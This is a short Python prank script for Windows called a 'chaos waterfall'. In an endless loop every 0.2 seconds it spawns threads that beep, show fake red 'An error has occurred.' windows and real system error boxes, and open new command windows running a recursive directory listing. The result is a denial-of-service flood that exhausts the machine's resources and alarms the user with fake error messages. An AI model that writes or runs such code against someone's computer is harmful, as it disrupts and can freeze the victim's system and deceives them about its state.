import tkinter as tk
import threading
import time
import winsound
import ctypes
import os

# Custom red box with beep
def show_custom_error():
    winsound.Beep(1000, 300)
    root = tk.Tk()
    root.title("Error")
    root.configure(bg="red")
    root.geometry("300x100")
    root.attributes('-topmost', True)
    root.resizable(False, False)
    label = tk.Label(root, text="An error has occurred.", fg="white", bg="red", font=("Arial", 14))
    label.pack(expand=True)
    root.after(2000, root.destroy)
    root.mainloop()

# System Windows error box
def show_system_error():
    ctypes.windll.user32.MessageBoxW(0, "An error has occurred.", "System Error", 0x10)

# Open CMD with green text and run dir /s
def open_green_cmd_dir():
    cmd = 'start cmd /k "color 0A && echo Scanning... && dir /s && pause"'
    os.system(cmd)

# Launch chaos waterfall
while True:
    threading.Thread(target=show_custom_error).start()
    threading.Thread(target=show_system_error).start()
    threading.Thread(target=open_green_cmd_dir).start()
    time.sleep(0.2)  # Lower = more chaos
